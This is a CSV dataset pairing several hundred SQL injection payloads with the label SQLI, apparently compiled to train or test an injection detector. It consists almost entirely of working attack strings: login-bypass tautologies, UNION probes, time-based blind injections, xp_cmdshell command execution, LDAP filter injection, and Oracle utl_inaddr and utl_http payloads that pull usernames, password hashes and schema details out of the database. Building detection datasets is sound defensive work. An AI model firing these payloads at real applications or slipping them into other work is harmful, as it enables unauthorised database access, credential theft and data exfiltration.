payload,attack
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",SQLI
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",SQLI
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",SQLI
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",SQLI
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",SQLI
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",SQLI
""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",SQLI
""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",SQLI
""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",SQLI
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",SQLI
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",SQLI
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",SQLI
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",SQLI
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",SQLI
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",SQLI
"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",SQLI
"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",SQLI
"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",SQLI
" and 0=benchmark(3000000,MD5(1))%20/*",SQLI
" and 0=benchmark(3000000,MD5(1))%20--",SQLI
" and 0=benchmark(3000000,MD5(1))%20%23",SQLI
" and 0=benchmark(3000000,MD5(1))%20/*",SQLI
" and 0=benchmark(3000000,MD5(1))%20--",SQLI
" and 0=benchmark(3000000,MD5(1))%20%23",SQLI
""" and 0=benchmark(3000000,MD5(1))%20/*",SQLI
""" and 0=benchmark(3000000,MD5(1))%20--",SQLI
""" and 0=benchmark(3000000,MD5(1))%20%23",SQLI
") and 0=benchmark(3000000,MD5(1))%20/*",SQLI
") and 0=benchmark(3000000,MD5(1))%20--",SQLI
") and 0=benchmark(3000000,MD5(1))%20%23",SQLI
")) and 0=benchmark(3000000,MD5(1))%20/*",SQLI
")) and 0=benchmark(3000000,MD5(1))%20--",SQLI
")) and 0=benchmark(3000000,MD5(1))%20%23",SQLI
"))) and 0=benchmark(3000000,MD5(1))%20/*",SQLI
"))) and 0=benchmark(3000000,MD5(1))%20--",SQLI
"))) and 0=benchmark(3000000,MD5(1))%20%23",SQLI
")))) and 0=benchmark(3000000,MD5(1))%20/*",SQLI
")))) and 0=benchmark(3000000,MD5(1))%20--",SQLI
")))) and 0=benchmark(3000000,MD5(1))%20%23",SQLI
") and 0=benchmark(3000000,MD5(1))%20/*",SQLI
") and 0=benchmark(3000000,MD5(1))%20--",SQLI
") and 0=benchmark(3000000,MD5(1))%20%23",SQLI
""") and 0=benchmark(3000000,MD5(1))%20/*",SQLI
""") and 0=benchmark(3000000,MD5(1))%20--",SQLI
""") and 0=benchmark(3000000,MD5(1))%20%23",SQLI
")) and 0=benchmark(3000000,MD5(1))%20/*",SQLI
")) and 0=benchmark(3000000,MD5(1))%20--",SQLI
")) and 0=benchmark(3000000,MD5(1))%20%23",SQLI
""")) and 0=benchmark(3000000,MD5(1))%20/*",SQLI
""")) and 0=benchmark(3000000,MD5(1))%20--",SQLI
""")) and 0=benchmark(3000000,MD5(1))%20%23",SQLI
"))) and 0=benchmark(3000000,MD5(1))%20/*",SQLI
"))) and 0=benchmark(3000000,MD5(1))%20--",SQLI
"))) and 0=benchmark(3000000,MD5(1))%20%23",SQLI
"""))) and 0=benchmark(3000000,MD5(1))%20/*",SQLI
"""))) and 0=benchmark(3000000,MD5(1))%20--",SQLI
"""))) and 0=benchmark(3000000,MD5(1))%20%23",SQLI
")))) and 0=benchmark(3000000,MD5(1))%20/*",SQLI
")))) and 0=benchmark(3000000,MD5(1))%20--",SQLI
")))) and 0=benchmark(3000000,MD5(1))%20%23",SQLI
""")))) and 0=benchmark(3000000,MD5(1))%20/*",SQLI
""")))) and 0=benchmark(3000000,MD5(1))%20--",SQLI
""")))) and 0=benchmark(3000000,MD5(1))%20%23",SQLI
%20--,SQLI
--';,SQLI
%20;,SQLI
\x23,SQLI
\x27,SQLI
\x3D%20\x3B',SQLI
\x3D%20\x27,SQLI
\x27\x4F\x52 SELECT *,SQLI
\x27\x6F\x72 SELECT *,SQLI
or%20select *,SQLI
admin'--,SQLI
"<>""'%;)(&+",SQLI
%20or%20''=',SQLI
%20or%20'x'='x,SQLI
"""%20or%20""x""=""x",SQLI
)%20or%20('x'='x,SQLI
0 or 1=1,SQLI
 or 0=0 --,SQLI
""" or 0=0 --",SQLI
or 0=0 --,SQLI
 or 0=0 #,SQLI
""" or 0=0 #",SQLI
or 0=0 #,SQLI
 or 1=1--,SQLI
""" or 1=1--",SQLI
 or '1'='1'--,SQLI
"""' or 1 --'""",SQLI
or 1=1--,SQLI
or%201=1,SQLI
or%201=1 --,SQLI
 or 1=1 or ''=',SQLI
""" or 1=1 or """"=""",SQLI
 or a=a--,SQLI
""" or ""a""=""a",SQLI
) or ('a'='a,SQLI
""") or (""a""=""a",SQLI
"hi"" or ""a""=""a",SQLI
"hi"" or 1=1 --",SQLI
hi' or 1=1 --,SQLI
hi' or 'a'='a,SQLI
hi') or ('a'='a,SQLI
"hi"") or (""a""=""a",SQLI
hi' or 'x'='x';,SQLI
@variable,SQLI
",@variable",SQLI
 or username like '%,SQLI
 or uname like '%,SQLI
 or userid like '%,SQLI
 or uid like '%,SQLI
 or user like '%,SQLI
exec xp,SQLI
exec sp,SQLI
; exec master..xp_cmdshell,SQLI
; exec xp_regread,SQLI
t'exec master..xp_cmdshell 'nslookup www.google.com'--,SQLI
--sp_password,SQLI
\x27UNION SELECT,SQLI
 UNION SELECT,SQLI
 UNION ALL SELECT,SQLI
 or (EXISTS),SQLI
 (select top 1,SQLI
||UTL_HTTP.REQUEST,SQLI
1;SELECT%20*,SQLI
to_timestamp_tz,SQLI
tz_offset,SQLI
&lt;&gt;&quot;'%;)(&amp;+,SQLI
%20or%201=1,SQLI
%27%20or%201=1,SQLI
%20$(sleep%2050),SQLI
%20'sleep%2050',SQLI
char%4039%41%2b%40SELECT,SQLI
&apos;%20OR,SQLI
sqlattempt1,SQLI
(sqlattempt2),SQLI
%7C,SQLI
*|,SQLI
%2A%7C,SQLI
*(|(mail=*)),SQLI
%2A%28%7C%28mail%3D%2A%29%29,SQLI
*(|(objectclass=*)),SQLI
%2A%28%7C%28objectclass%3D%2A%29%29,SQLI
21%,SQLI
 or 1=1 or ''=',SQLI
 or ''=',SQLI
x' or 1=1 or 'x'='y,SQLI
 and 1=1,SQLI
 and USER=USER,SQLI
 and user()=user(),SQLI
 and 2=0,SQLI
 or 2=2,SQLI
 and '2'='2,SQLI
 and '2'='0,SQLI
 or '2'='2,SQLI
/*ora_mysql*/and/**/2=2,SQLI
/*ora_mysql*/and/**/2=0,SQLI
/*ora_mysql*/and/**/'2'='2,SQLI
/*ora_mysql*/and/**/'2'='0,SQLI
/*ora_mysql*/or/**/'2'='2,SQLI
 and 2=2#mysql,SQLI
 and 2=0#mysql,SQLI
 and 2=2-- oracle_mysql,SQLI
 and 2=0-- oracle_mysql,SQLI
 and '2'='2'#mysql,SQLI
 and '2'='0'#mysql,SQLI
 and '2'='2'-- oracle,SQLI
 and '2'='0'-- oracle,SQLI
999999999999999999,SQLI
1E+100,SQLI
2 or 2=2,SQLI
2' or '2'='2,SQLI
order by 1--,SQLI
admin'--,SQLI
admin',SQLI
test,SQLI
test--,SQLI
 or 1=1--,SQLI
or 1=1--,SQLI
or 1=1,SQLI
or 1=1#,SQLI
""" or 1=1#",SQLI
a' or 1=1--,SQLI
"""a"""" or 1=1--""",SQLI
 or a = a,SQLI
a' or 'a' = 'a,SQLI
1 or 1=1,SQLI
a' waitfor delay '0:0:10'--,SQLI
1 waitfor delay '0:0:10'--,SQLI
declare @q nvarchar (4000) select @q =0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,SQLI
declare @s varchar(22) select @s =,SQLI
0x77616974666F722064656C61792027303A303A31302700 exec(@s),SQLI
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),SQLI
declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e,SQLI
 or 1=1,SQLI
 or 1=1 --,SQLI
x' AND userid IS NULL; --,SQLI
x' AND email IS NULL; --,SQLI
anything' OR 'x'='x,SQLI
x' AND 1=(SELECT COUNT(*) FROM tabname); --,SQLI
x' AND members.email IS NULL; --,SQLI
x' OR full_name LIKE '%Bob%,SQLI
23 OR 1=1,SQLI
; exec master..xp_cmdshell 'ping 172.10.1.255'--,SQLI
%20or%20''=',SQLI
%20or%20'x'='x,SQLI
%20or%20x=x,SQLI
)%20or%20('x'='x,SQLI
0 or 1=1,SQLI
 or 0=0 --,SQLI
""" or 0=0 --",SQLI
or 0=0 --,SQLI
 or 0=0 #,SQLI
" or 0=0 #""",SQLI
or 0=0 #,SQLI
 or 1=1--,SQLI
""" or 1=1--",SQLI
 or '1'='1'--,SQLI
 or 1 --',SQLI
or 1=1--,SQLI
or%201=1,SQLI
or%201=1 --,SQLI
 or 1=1 or ''=',SQLI
" or 1=1 or """"=",SQLI
 or a=a--,SQLI
 or a=a,SQLI
) or ('a'='a,SQLI
) or (a=a,SQLI
hi or a=a,SQLI
"hi or 1=1 --""",SQLI
hi' or 1=1 --,SQLI
hi' or 'a'='a,SQLI
hi') or ('a'='a,SQLI
"""hi"""") or (""""a""""=""""a""",SQLI
hi' or 'x'='x';,SQLI
PRINT @@variable,SQLI
 or username like '%,SQLI
 or uname like '%,SQLI
 or userid like '%,SQLI
 or uid like '%,SQLI
 or user like '%,SQLI
; exec master..xp_cmdshell,SQLI
; exec xp_regread,SQLI
t'exec master..xp_cmdshell 'nslookup www.google.com'--,SQLI
--sp_password,SQLI
\x27UNION SELECT,SQLI
 UNION SELECT,SQLI
 UNION ALL SELECT,SQLI
 or (EXISTS),SQLI
 (select top 1,SQLI
||UTL_HTTP.REQUEST,SQLI
1;SELECT%20*,SQLI
to_timestamp_tz,SQLI
tz_offset,SQLI
"<>""'%;)(&+",SQLI
%20or%201=1,SQLI
%27%20or%201=1,SQLI
%20$(sleep%2050),SQLI
%20'sleep%2050',SQLI
char%4039%41%2b%40SELECT,SQLI
&apos;%20OR,SQLI
%2A%7C,SQLI
*(|(mail=*)),SQLI
%2A%28%7C%28mail%3D%2A%29%29,SQLI
*(|(objectclass=*)),SQLI
%2A%28%7C%28objectclass%3D%2A%29%29,SQLI
 or 1=1 or ''=',SQLI
 or ''=',SQLI
x' or 1=1 or 'x'='y,SQLI
*/*,SQLI
a' or 3=3--,SQLI
"""a"""" or 3=3--""",SQLI
 or 3=3,SQLI
 or 3=3 --,SQLI
a' --,SQLI
a' or 1=1; --,SQLI
 and 1=0) union all,SQLI
? or 1=1 --,SQLI
x' and userid is NULL; --,SQLI
x' and email is NULL; --,SQLI
anything' or 'x'='x,SQLI
x' and 1=(select count(*) from tabname); --,SQLI
x' and members.email is NULL; --,SQLI
x' or full_name like '%bob%,SQLI
23 or 1=1; --,SQLI
; exec master..xp_cmdshell 'ping 172.10.1.255'--,SQLI
1 or 1=1,SQLI
1' or '1'='1,SQLI
1 and user_name() = 'dbo',SQLI
1 exec sp_ (or exec xp_),SQLI
1 and 1=1,SQLI
1' and 1=(select count(*) from tablenames); --,SQLI
1 and user_name() = 'dbo',SQLI
\'; desc users; --,SQLI
1' and non_existant_table = '1,SQLI
 or username is not NULL or username = ',SQLI
"1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116",SQLI
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",SQLI
1 uni/**/on select all from where,SQLI
 or ‘1’=’1,SQLI
 or '1'='1,SQLI
||utl_http.request('httP://192.168.1.1/')||',SQLI
" || myappadmin.adduser('admin', 'newpass') || '",SQLI
 AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,SQLI
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",SQLI
"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",SQLI
||6,SQLI
||'6,SQLI
(||6),SQLI
 or 1=1-- ,SQLI
or 1=1,SQLI
